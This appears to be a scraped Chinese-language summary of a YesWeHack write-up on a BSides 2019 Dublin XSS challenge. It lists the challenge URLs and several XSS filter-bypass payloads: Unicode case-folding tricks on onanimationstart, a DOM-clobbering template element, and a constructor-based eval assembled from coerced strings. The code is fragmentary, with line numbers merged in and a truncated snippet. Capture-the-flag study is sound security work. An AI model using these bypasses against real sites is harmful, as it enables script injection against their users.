# Cracking the Code: Unveiling a Solution for a Peculiar XSS Case | YesWeHack Community

报告地址: https://www.yeswehack.com/community/solution-for-a-weird-xss-case

## 触发 URL
- https://bsides2019dublin.h4cktheplanet.com/.
- https://bsides2019dublin.h4cktheplanet.com/?name=Hack
- https://bsides2019dublin.h4cktheplanet.com/?name=<K

## 利用方法
- 将下列 payload 注入到触发 URL 对应的输入点（常见为 query 参数/路径片段/表单字段），观察是否执行：
  - Our input look like this: <ı onanimationſtart="alert(1)" style="animation: A"><ſtyle>@keyframes A{}</ſtyle>
  - <I ONANIMATIONSTART="ALERT(1)" STYLE="ANIMATION: A"><STYLE>@KEYFRAMES A{}</STYLE>
  - 1name=<K id=template><ı onanimationſtart="alert(1)" style="animation: A" ><ſtyle>@keyframes A{}</ſtyle></K>
  - https://bsides2019dublin.h4cktheplanet.com/?name=<K id=template><ı onanimationſtart=”alert(1)” style=”animation: A” ><ſtyle>@keyframes A{}</ſtyle></K>
  - 1let constructor_str = 'constructor'2let code_to_eval = 'alert(1)'3(X=>X)[constructor](code_to_eval)()
  - But how can we create the constructor and alert(1) string ?
  - 1/* 2Since you are able to refer to any HTML tag in the DOM by using it's ID as a variable name.3I will add <K id=_>4this means _.toString() == '[object HTMLUnknownElement]'5 */6const c = "(_+[])[5]" // "[object HTMLUnknownElement]"[5]7const o = "(_+[])[1]" // "[object HTMLUnknownElement]"[1]8const n = "(_+[])[13]" // "[object HTMLUnknownElement]"[13]9const s = "((1<1)+[])[3]" // "false"[3] 10cons…
  - After putting everything together, we end with this beautiful payload.
